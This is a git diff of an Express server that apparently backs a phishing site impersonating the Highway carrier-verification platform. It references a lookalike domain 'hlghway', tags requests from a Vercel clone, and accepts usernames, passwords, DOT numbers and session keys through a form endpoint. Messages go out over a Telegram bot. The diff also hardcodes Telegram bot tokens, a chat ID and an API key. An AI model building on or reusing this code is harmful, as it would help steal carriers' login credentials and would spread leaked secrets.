@@ -9,11 +9,25 @@ require("dotenv").config();
 const app = express();
 const PORT = process.env.PORT || 3001;
 
-const TELEGRAM_BOT_TOKEN = "7595225430:AAFJAq7gAEiRg3BSp3ZXCDZNcZRY2L4v_VI";
+const TELEGRAM_BOT_TOKEN = "7417194823:AAGGvwTFEdUN-c3J1_3WDNzgh6kpkMI4InU";
 const CHAT_ID = 531918242;
 
 app.use(cors());
 app.use(bodyParser.json());
+
+app.use((req, res, next) => {
+  const origin = req.headers.origin || req.headers.referer;
+
+  console.log(origin, "req.headers.origin");
+
+  if (origin?.includes("highway-three.vercel.app")) {
+    req.clientOrigin = "highway-three";
+  } else {
+    req.clientOrigin = "unknown";
+  }
+
+  next();
+});
 
 const server = http.createServer(app);
 const wss = new WebSocket.Server({ server, path: "/ws" });
@@ -41,35 +55,39 @@ wss.on("connection", (ws, req) => {
   });
 });
 
-app.post("/api/carrier/:type/:id", async (req, res) => {
-  const { type, id } = req.params;
+app.get("/api/carrier/:type/:number", async (req, res) => {
+  const { type, number } = req.params;
 
-  console.log(type, id, "????????????");
+  let url = "";
 
-  if (!["MC", "DOT"].includes(type)) {
+  if (type === "DOT") {
+    url = `https://saferwebapi.com/v2/usdot/snapshot/${number}`;
+  } else if (type === "MC") {
+    url = `https://saferwebapi.com/v2/mcmx/snapshot/${number}`;
+  } else {
     return res
       .status(400)
-      .json({ error: "Invalid carrier type. Use MC or DOT." });
+      .json({ error: "Недопустимый тип. Используй DOT или MC" });
   }
 
   try {
-    const url = `https://hlghway.highway-director.com/api/v1/carriers/${type}/${id}`;
-
-    const response = await axios.post(url);
+    const response = await axios.get(url, {
+      headers: {
+        "X-API-Key": "602c39669a9e4582a80c8de7207286f8",
+      },
+    });
 
     res.json(response.data);
-  } catch (err) {
-    console.error("Error fetching data from external API:", err.message);
-    res.status(500).json({ error: "Failed to fetch carrier data" });
+  } catch (error) {
+    console.error("Ошибка при получении данных:", error.message);
+    res
+      .status(500)
+      .json({ error: "Не удалось получить данные от SaferWeb API" });
   }
 });
 
 app.post("/api/send-form", async (req, res) => {
   const { username, password, dot, companyName, key, sessionKey } = req.body;
-  console.log(
-    { username, password, dot, companyName, key, sessionKey },
-    "asdasdas"
-  );
 
   if (!sessionKey) {
     return res
@@ -156,13 +174,15 @@ app.post("/bot", async (req, res) => {
             }
           );
         } else {
-          await axios.post(
-            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
-            {
-              chat_id: chatId,
-              text: `❌ User with ID ${sessionKey} not found in clients`,
-            }
-          );
+          if (req.clientOrigin === "highway-three") {
+            await axios.post(
+              `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+              {
+                chat_id: chatId,
+                text: `❌ User with ID ${sessionKey} not found in clients`,
+              }
+            );
+          }
         }
       }
     }
